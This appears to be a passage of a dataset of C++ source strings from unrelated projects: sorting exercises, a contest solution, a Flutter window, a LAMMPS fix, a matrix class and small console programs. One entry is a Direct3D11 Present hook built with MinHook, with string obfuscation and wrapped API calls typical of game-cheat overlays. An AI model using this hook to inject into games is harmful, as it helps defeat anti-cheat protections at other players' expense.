sf::Keyboard::Key gui::UserInterface::getKey() const\n{\n    return eventInfo.key;\n}\n\nconst char* gui::UserInterface::sfKeyToChar(sf::Keyboard::Key key)\n{\n    const auto it = keyNames.find(key);\n    std::cout << it->second << \"\\n\";\n    return it->second;\n}\n\n\n\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Node {\n    int data;\n    Node* next;\n    Node* prev;\n};\n\nNode* createNode(int value) {\n    Node* newNode = new Node();\n    newNode->data = value;\n    newNode->next = NULL;\n    newNode->prev = NULL;\n    return newNode;\n}\n\n//! Ham nhap danh sach\nvoid input(Node*& head, Node*& tail, int n)\n{\n    cout << \"\\n=> Nhap gia tri cua danh sach: \" << endl;\n    for (int i = 0; i < n; i++)\n    {\n        int value;\n        cout << \"Node [\" << i << \"] = \";\n        cin >> value;\n        Node* newNode = createNode(value);\n        if (head == NULL) {\n            head = tail = newNode;\n        } else {\n            tail->next = newNode;\n            newNode->prev = tail;\n            tail = newNode;\n        }\n    }\n}\n\n//! Ham xuat danh sach\nvoid output(Node* head)\n{\n    cout << \"[ \";\n    Node* current = head;\n    while (current != NULL)\n    {\n        cout << current->data << \" \";\n        current = current->next;\n    }\n    cout << \"]\" << endl;\n}\n\n//! Ham sap xep danh sach\n// Insertion sort\nvoid insertionSort(Node* head)\n{\n    if (!head || !head->next)\n        return;\n\n    Node *i, *j;\n    for (i = head->next; i != NULL; i = i->next)\n    {\n        int key = i->data;\n        j = i->prev;\n        while (j != NULL && j->data > key)\n        {\n            j->next->data = j->data;\n            j = j->prev;\n        }\n        if (j == NULL)\n            head->data = key;\n        else\n            j->next->data = key;\n    }\n}\n\n// Selection sort\nvoid selectionSort(Node* head)\n{\n    if (!head || !head->next)\n        return;\n\n    Node *i, *j;\n    for (i = head; i->next != NULL; i = i->next)\n    {\n        Node* min = i;\n        for (j = i->next; j != NULL; j = j->next)\n        {\n            if (j->data < min->data)\n                min = j;\n        }\n        if (min != i)\n            swap(min->data, i->data);\n    }\n}\n\n// Interchange sort\nvoid interchangeSort(Node* head)\n{\n    if (!head || !head->next)\n        return;\n\n    Node* i, *j;\n    for (i = head; i->next != NULL; i = i->next)\n    {\n        for (j = i->next; j != NULL; j = j->next)\n        {\n            if (i->data > j->data)\n            {\n                swap(i->data, j->data);\n            }\n        }\n    }\n}\n\n\n// Bubble sort\nvoid bubbleSort(Node* head)\n{\n    if (!head || !head->next)\n        return;\n\n    bool swapped;\n    Node *ptr1, *lptr = NULL;\n    do {\n        swapped = false;\n        ptr1 = head;\n        while (ptr1->next != lptr) {\n            if (ptr1->data > ptr1->next->data) {\n                swap(ptr1->data, ptr1->next->data);\n                swapped = true;\n            }\n            ptr1 = ptr1->next;\n        }\n        lptr = ptr1;\n    } while (swapped);\n}\n\nvoid quickSort(Node* head, Node* tail) {\n    if (head != NULL && tail != NULL && head != tail && head->prev != tail) {\n        Node* pivot = head;\n        Node* left = head->next;\n        Node* right = tail;\n\n        while (left != right && right->next != left) {\n            while (left->data < pivot->data)\n                left = left->next;\n            while (right->data > pivot->data)\n                right = right->prev;\n\n            if (left != right && right->next != left) {\n                swap(left->data, right->data);\n            }\n        }\n\n        swap(pivot->data, right->data);\n        quickSort(head, right->prev);\n        quickSort(right->next, tail);\n    }\n}\n\nint binarySearch(Node* head, int Y) {\n    Node* left = head;\n    Node* right = NULL;\n    while (right == NULL || right != left) {\n        Node* mid = left;\n        int count = 0;\n        while (mid != right && count < 2) {\n            mid = mid->next;\n            count++;\n        }\n\n        if (mid->data == Y)\n            return mid->data;\n\n        if (mid->data < Y)\n            left = mid->next;\n        else\n            right = mid;\n    }\n\n    return -1;\n}\n\n\nint main()\n{\n    system(\"cls\");\n\n    int n;\n    int Y;\n    int choice;\n    Node* head = NULL;\n    Node* tail = NULL;\n\n    while (true)\n    {\n        cout << \" -=- CHUONG TRINH SAP XEP DANH SACH LIEN KET KEP -=- \" << endl;\n        cout << \"====================================================\" << endl;\n        cout << \"=  1. Chen phan tu vao danh sach.                 =\" << endl;\n        cout << \"=--------------------------------------------------=\" << endl;\n        cout << \"=  2. Insertion sort                               =\" << endl;\n        cout << \"=  3. Selection sort                               =\" << endl;\n        cout << \"=  4. Intercange sort                              =\" << endl;\n        cout << \"=  5. Bubble sort                                  =\" << endl;\n        cout << \"=  6. Quicksort                                    =\" << endl;\n        cout << \"=--------------------------------------------------=\" << endl;\n        cout << \"=  7. Xuat danh sach vua nhap                      =\" << endl;\n        cout << \"=--------------------------------------------------=\" << endl;\n        cout << \"=  8. Tim kiem nhi phan                            =\" <<",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include <bits/stdc++.h>\r\n#include <ext/pb_ds/assoc_container.hpp>\r\n#include <ext/pb_ds/tree_policy.hpp>\r\n\r\nusing namespace std;\r\nusing namespace __gnu_pbds;\r\n\r\n#define ull unsigned long long int\r\n#define ld long double\r\n#define ll long long\r\n#define PI acos(-1)\r\n#define endl \"\\n\"\r\n#define all(x) x.begin(), x.end()\r\n#define fixed(n) cout << fixed << setprecision(n)\r\n#define loop(i, n) for (int i = 0; i < (int)n; i++)\r\n\r\nconst int OO = 0x3f3f3f3f;\r\nconst int N = 1e5 + 7;\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\nvoid Ahmed_Faraj()\r\n{\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"input.txt\", \"r\", stdin);\r\n    freopen(\"output.txt\", \"w\", stdout);\r\n#endif\r\n}\r\n\r\nvoid solve()\r\n{\r\n    ll n, m;\r\n    cin >> n >> m;\r\n    vector<ll> v(n, 3);\r\n    ll rel[m][2] = {0};\r\n    for (size_t i = 0; i < m; i++)\r\n    {\r\n        cin >> rel[i][0] >> rel[i][1];\r\n    }\r\n    v[0] = 1;\r\n    for (ll i = 0; i < m; i++)\r\n    {\r\n        if (rel[i][0] == 1 || rel[i][1] == 1)\r\n        {\r\n            v[rel[i][0] - 1] = 1;\r\n            v[rel[i][1] - 1] = 1;\r\n        }\r\n        else\r\n        {\r\n            // cout << v[rel[i][0] - 1] << \" \" << v[rel[i][1] - 1] << \" \";\r\n            if (v[rel[i][0] - 1] < v[rel[i][1] - 1])\r\n            {\r\n                v[rel[i][1] - 1] = min(v[rel[i][1] - 1], v[rel[i][0] - 1] + 1);\r\n            }\r\n            else\r\n            {\r\n                v[rel[i][0] - 1] = min(v[rel[i][0] - 1], v[rel[i][1] - 1] + 1);\r\n            }\r\n        }\r\n    }\r\n    for (ll i = 0; i < m; i++)\r\n    {\r\n        if (rel[i][0] == 1 || rel[i][1] == 1)\r\n        {\r\n            v[rel[i][0] - 1] = 1;\r\n            v[rel[i][1] - 1] = 1;\r\n        }\r\n        else\r\n        {\r\n            // cout << v[rel[i][0] - 1] << \" \" << v[rel[i][1] - 1] << \" \";\r\n            if (v[rel[i][0] - 1] < v[rel[i][1] - 1])\r\n            {\r\n                v[rel[i][1] - 1] = min(v[rel[i][1] - 1], v[rel[i][0] - 1] + 1);\r\n            }\r\n            else\r\n            {\r\n                v[rel[i][0] - 1] = min(v[rel[i][0] - 1], v[rel[i][1] - 1] + 1);\r\n            }\r\n        }\r\n    }\r\n    for (size_t i = 1; i < n; i++)\r\n    {\r\n        if (v[i] == 1)\r\n        {\r\n            cout << \"1st\" << endl;\r\n        }\r\n        else if (v[i] == 2)\r\n        {\r\n            cout << \"2nd\" << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << \"3rd\" << endl;\r\n        }\r\n    }\r\n}\r\n\r\nsigned main()\r\n{\r\n    Ahmed_Faraj();\r\n    // fast();\r\n    ll test = 1;\r\n    // cin >> test;\r\n    while (test--)\r\n    {\r\n        solve();\r\n    }\r\n    return 0;\r\n}",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nvoid findWaitingTime(int processes[], int n, int bt[], int wt[]) {\r\n    wt[0] = 0;\r\n    for (int i = 1; i < n; i++) {\r\n        wt[i] = bt[i - 1] + wt[i - 1];\r\n    }\r\n}\r\n\r\nvoid findturnAroundTime(int processes[], int n, int bt[], int wt[], int tat[]) {\r\n    for (int i = 0; i < n; i++) {\r\n        tat[i] = bt[i] + wt[i];\r\n    }\r\n}\r\n\r\nvoid findAverageTime(int processes[], int n, int burst_time[]) {\r\n    int wt[n], tat[n], total_wt = 0, total_tat = 0;\r\n    findWaitingTime(processes, n, burst_time, wt);\r\n    findturnAroundTime(processes, n, burst_time, wt, tat);\r\n    cout << \"Processes\\tBurst Time\\tWaiting Time\\tTurn Around Time\\n\";\r\n    for (int i = 0; i < n; i++) {\r\n        total_wt += wt[i];\r\n        total_tat += tat[i];\r\n        cout << \" \" << processes[i] << \"\\t\\t\" << burst_time[i] << \"\\t\\t\" << wt[i] << \"\\t\\t\" << tat[i] << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int processes[] = {1, 2, 3, 4};\r\n    int n = sizeof(processes) / sizeof(processes[0]);\r\n    int burst_time[] = {21, 3, 6, 2};\r\n    findAverageTime(processes, n, burst_time);\r\n    return 0;\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/* ----------------------------------------------------------------------\n   LAMMPS - Large-scale Atomic/Molecular Massively Parallel Simulator\n   http://lammps.sandia.gov, Sandia National Laboratories\n   Steve Plimpton, sjplimp@sandia.gov\n\n   Copyright (2003) Sandia Corporation.  Under the terms of Contract\n   DE-AC04-94AL85000 with Sandia Corporation, the U.S. Government retains\n   certain rights in this software.  This software is distributed under\n   the GNU General Public License.\n\n   See the README file in the top-level LAMMPS directory.\n\n   Modified by Olav Galteland, olav.galteland@ntnu.no\n   Reflective particle method: 10.1103/PhysRevE.57.7259\n------------------------------------------------------------------------- */\n\n#include <stdlib.h>\n#include <string.h>\n#include \"fix_wall_rpm.h\"\n#include \"atom.h\"\n#include \"comm.h\"\n#include \"update.h\"\n#include \"modify.h\"\n#include \"domain.h\"\n#include \"lattice.h\"\n#include \"input.h\"\n#include \"variable.h\"\n#include \"error.h\"\n#include \"force.h\"\n\nusing namespace LAMMPS_NS;\nusing namespace FixConst;\n\nenum{XLO=0,XHI=1,YLO=2,YHI=3,ZLO=4,ZHI=5};\nenum{NONE=0,EDGE,CONSTANT,VARIABLE};\n\n/* ---------------------------------------------------------------------- */\n\nFixWallRPM::FixWallRPM(LAMMPS *lmp, int narg, char **arg) :\n  Fix(lmp, narg, arg),\n  nwall(0),\n  rng(lmp, 987334)\n{\n  if (narg < 4) error->all(FLERR,\"Illegal fix wall/rpm command\");\n\n  // parse args\n\n  nwall = 0;\n  int scaleflag = 1;\n  //p = atof(arg[3]);\n\n  int iarg = 3;\n  while (iarg < narg) {\n    if ((strcmp(arg[iarg],\"xlo\") == 0) || (strcmp(arg[iarg],\"xhi\") == 0) ||\n        (strcmp(arg[iarg],\"ylo\") == 0) || (strcmp(arg[iarg],\"yhi\") == 0) ||\n        (strcmp(arg[iarg],\"zlo\") == 0) || (strcmp(arg[iarg],\"zhi\") == 0)) {\n      if (iarg+3 > narg) error->all(FLERR,\"Illegal fix wall/rpm command\");\n\n      int newwall;\n      if (strcmp(arg[iarg],\"xlo\") == 0) newwall = XLO;\n      else if (strcmp(arg[iarg],\"xhi\") == 0) newwall = XHI;\n      else if (strcmp(arg[iarg],\"ylo\") == 0) newwall = YLO;\n      else if (strcmp(arg[iarg],\"yhi\") == 0) newwall = YHI;\n      else if (strcmp(arg[iarg],\"zlo\") == 0) newwall = ZLO;\n      else if (strcmp(arg[iarg],\"zhi\") == 0) newwall = ZHI;\n\n      for (int m = 0; (m < nwall) && (m < 6); m++)\n        if (newwall == wallwhich[m])\n          error->all(FLERR,\"Wall defined twice in fix wall/rpm command\");\n\n      wallwhich[nwall] = newwall;\n      if (strcmp(arg[iarg+1],\"EDGE\") == 0) {\n        wallstyle[nwall] = EDGE;\n        int dim = wallwhich[nwall] / 2;\n        int side = wallwhich[nwall] % 2;\n        if (side == 0) coord0[nwall] = domain->boxlo[dim];\n        else coord0[nwall] = domain->boxhi[dim];\n      } else if (strstr(arg[iarg+1],\"v_\") == arg[iarg+1]) {\n        wallstyle[nwall] = VARIABLE;\n        int n = strlen(&arg[iarg+1][2]) + 1;\n        varstr[nwall] = new char[n];\n        strcpy(varstr[nwall],&arg[iarg+1][2]);\n      } else {\n        wallstyle[nwall] = CONSTANT;\n        coord0[nwall] = utils::numeric(FLERR,arg[iarg+1],false,lmp);\n      }\n        \n      // Only allow for one p TODO: One p for each wall\n      p = atof(arg[iarg+2]);\n      nwall++;\n      iarg += 3;\n\n    } else if (strcmp(arg[iarg],\"units\") == 0) {\n      if (iarg+2 > narg) error->all(FLERR,\"Illegal wall/rpm command\");\n      if (strcmp(arg[iarg+1],\"box\") == 0) scaleflag = 0;\n      else if (strcmp(arg[iarg+1],\"lattice\") == 0) scaleflag = 1;\n      else error->all(FLERR,\"Illegal fix wall/rpm command\");\n      iarg += 2;\n    } else error->all(FLERR,\"Illegal fix wall/rpm command\");\n  }\n\n  // error check\n\n  if (nwall == 0) error->all(FLERR,\"Illegal fix wall command\");\n    \n  // Why not?\n  /*\n  for (int m = 0; m < nwall; m++) {\n    if ((wallwhich[m] == XLO || wallwhich[m] == XHI) && domain->xperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n    if ((wallwhich[m] == YLO || wallwhich[m] == YHI) && domain->yperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n    if ((wallwhich[m] == ZLO || wallwhich[m] == ZHI) && domain->zperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n  }\n  */\n\n  for (int m = 0; m < nwall; m++)\n    if ((wallwhich[m] == ZLO || wallwhich[m] == ZHI) && domain->dimension == 2)\n      error->all(FLERR,\n                 \"Cannot use fix wall/rpm zlo/zhi for a 2d simulation\");\n\n  // scale factors for CONSTANT and VARIABLE walls\n\n  int flag = 0;\n  for (int m = 0; m < nwall; m++)\n    if (wallstyle[m] != EDGE) flag = 1;\n\n  if (flag) {\n    if (scaleflag) {\n      xscale = domain->lattice->xlattice;\n      yscale = domain->lattice->ylattice;\n      zscale = domain->lattice->zlattice;\n    }\n    else xscale = yscale = zscale = 1.0;\n\n    for (int m = 0; m < nwall; m++) {\n      if (wallstyle[m] != CONSTANT) continue;\n      if (wallwhich[m] < YLO) coord0[m] *= xscale;\n      else if (wallwhich[m] < ZLO) coord0[m] *= yscale;\n      else coord0[m] *= zscale;\n    }\n  }\n\n  // set varflag if any wall positions are variable\n\n  varflag = 0;\n  for (int m =",
    "#include \"s21_matrix_oop.h\"\n\nS21Matrix::S21Matrix() { ResetMatrix(); }\n\nS21Matrix::S21Matrix(int rows, int cols) {\n  if (rows > 0 && cols > 0) {\n    CreateMatrix(rows, cols);\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nS21Matrix::S21Matrix(const S21Matrix& other) {\n  CreateMatrix(other.rows_, other.cols_);\n  CopyMatrix(other.matrix_);\n}\n\nS21Matrix::S21Matrix(S21Matrix&& other) noexcept {\n  rows_ = other.rows_;\n  cols_ = other.cols_;\n  matrix_ = other.matrix_;\n  other.ResetMatrix();\n}\n\nS21Matrix::~S21Matrix() {\n  DeleteMatrix();\n  ResetMatrix();\n}\n\nbool S21Matrix::EqMatrix(const S21Matrix& other) {\n  bool res = true;\n  if (IsCorrectMatrixesSizes(other) && rows_ == other.rows_ &&\n      cols_ == other.cols_) {\n    for (int i = 0; i < rows_; i++) {\n      for (int j = 0; j < cols_; j++) {\n        if (fabs(matrix_[i][j] - other.matrix_[i][j]) > 1e-6) {\n          res = false;\n        }\n      }\n    }\n  } else {\n    res = false;\n  }\n  return res;\n}\n\nvoid S21Matrix::SumMatrix(const S21Matrix& other) {\n  if (IsCorrectMatrixesSizes(other)) {\n    if (rows_ == other.rows_ && cols_ == other.cols_) {\n      for (int i = 0; i < rows_; i++) {\n        for (int j = 0; j < cols_; j++) {\n          matrix_[i][j] += other.matrix_[i][j];\n        }\n      }\n    } else {\n      throw std::length_error(\"Lengths of matrixes is not equal\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nvoid S21Matrix::SubMatrix(const S21Matrix& other) {\n  if (IsCorrectMatrixesSizes(other)) {\n    if (rows_ == other.rows_ && cols_ == other.cols_) {\n      for (int i = 0; i < rows_; i++) {\n        for (int j = 0; j < cols_; j++) {\n          matrix_[i][j] -= other.matrix_[i][j];\n        }\n      }\n    } else {\n      throw std::length_error(\"Lengths of matrixes is not equal\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nvoid S21Matrix::MulNumber(const double num) {\n  if (IsCorrectMatrix_()) {\n    for (int i = 0; i < rows_; i++) {\n      for (int j = 0; j < cols_; j++) {\n        matrix_[i][j] *= num;\n      }\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nvoid S21Matrix::MulMatrix(const S21Matrix& other) {\n  if (IsCorrectMatrixesSizes(other)) {\n    if (rows_ == other.cols_ && cols_ == other.rows_) {\n      S21Matrix result(rows_, other.cols_);\n      for (int i = 0; i < rows_; i++) {\n        for (int j = 0; j < other.cols_; j++) {\n          for (int k = 0; k < cols_; ++k) {\n            result.matrix_[i][j] += matrix_[i][k] * other.matrix_[k][j];\n          }\n        }\n      }\n      *this = result;\n    } else {\n      throw std::length_error(\n          \"The number of columns of the first matrix is not equal to the \"\n          \"number of rows of the second matrix\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nS21Matrix S21Matrix::Transpose() {\n  if (IsCorrectMatrix_()) {\n    S21Matrix Transposed(cols_, rows_);\n\n    for (int i = 0; i < rows_; ++i) {\n      for (int j = 0; j < cols_; ++j) {\n        Transposed.matrix_[j][i] = matrix_[i][j];\n      }\n    }\n    return Transposed;\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nS21Matrix S21Matrix::CalcComplements() {\n  if (IsCorrectMatrix_()) {\n    if (rows_ == cols_) {\n      S21Matrix result(rows_, cols_);\n      S21Matrix minor(rows_ - 1, cols_ - 1);\n\n      for (int i = 0; i < rows_; i++) {\n        for (int j = 0; j < cols_; j++) {\n          minor = CreateMinor(i, j);\n          double minor_det = minor.Determinant();\n\n          double complement = minor_det * ((i + j) % 2 == 0 ? 1 : -1);\n          result(i, j) = complement;\n        }\n      }\n      return result;\n    } else {\n      throw std::invalid_argument(\"Matrix is now square\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\ndouble S21Matrix::Determinant() {\n  double det = 0.0;\n\n  if (IsCorrectMatrix_()) {\n    if (rows_ == cols_) {\n      if (rows_ == 2) {\n        det = matrix_[0][0] * matrix_[1][1] - matrix_[0][1] * matrix_[1][0];\n      } else if (rows_ == 1) {\n        det = matrix_[0][0];\n      } else {\n        int N = rows_;\n        int sign = 1;\n        for (int i = 0; i < N; i++) {\n          S21Matrix minor(N - 1, N - 1);\n\n          for (int j = 0; j < N - 1; j++) {\n            for (int k = 0; k < N - 1; k++) {\n              minor.matrix_[j][k] = matrix_[j + 1][(k >= i) ? k + 1 : k];\n            }\n          }\n          double minor_det = minor.Determinant();\n\n          det += sign * matrix_[0][i] * minor_det;\n          sign = -sign;\n        }\n      }\n    } else {\n      throw std::invalid_argument(\"Matrix is now square\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n  return det;\n}\n\nS21Matrix S21Matrix::InverseMatrix() {\n  double det = 0.0;\n\n  if (IsCorrectMatrix_())",
    "#include \"Service.hh\"\n#include <iostream>\n\nusing namespace std;\n\nint main() {\n\tsetlocale(LC_ALL, \"Polish\");\n\n\tstring carMake, carModel, customerName, customerAddress, customerPhone;\n\tint carYear;\n\tdouble partsCost, laborCost;\n\n\tcout << \"Creating new service...\" << endl;\n\tcout << \"Please enter the following information:\" << endl;\n\tcout << \"Enter car make: \";\n\tgetline(cin, carMake);\n\tcout << \"Enter car model: \";\n\tgetline(cin, carModel);\n\tcout << \"Enter car year: \";\n\tcin >> carYear;\n\tcin.ignore(); // Ignore the newline character left by previous input\n\tcout << \"Enter customer name: \";\n\tgetline(cin, customerName);\n\tcout << \"Enter customer address: \";\n\tgetline(cin, customerAddress);\n\tcout << \"Enter customer phone: \";\n\tgetline(cin, customerPhone);\n\tcout << \"Enter parts cost: \";\n\tcin >> partsCost;\n\tcout << \"Enter labor cost: \";\n\tcin >> laborCost;\n\n\tcout << endl << endl << \"Generating new service...\" << endl\n\t\t<< \"Creating new car...\" << endl;\n\tCar car(carMake, carModel, carYear);\n\n\tcout << \"Car created...\" << endl\n\t\t<< \"Creating new customer...\" << endl;\n\tCustomer customer(customerName, customerAddress, customerPhone);\n\n\tcout << \"Customer created...\" << endl\n\t\t<< \"Creating new service quote...\" << endl;\n\n\tServiceQuote serviceQuote(partsCost, laborCost);\n\tcout << \"Service quote created...\" << endl;\n\n\tService service(car, customer, serviceQuote);\n\tcout << \"Service created...\" << endl;\n\n\tcout << \"Service cost: \" << service.getCost() << endl;\n\n\tcout << endl << endl << endl << \"Press enter to exit...\";\n\treturn !!!getchar();\n}",
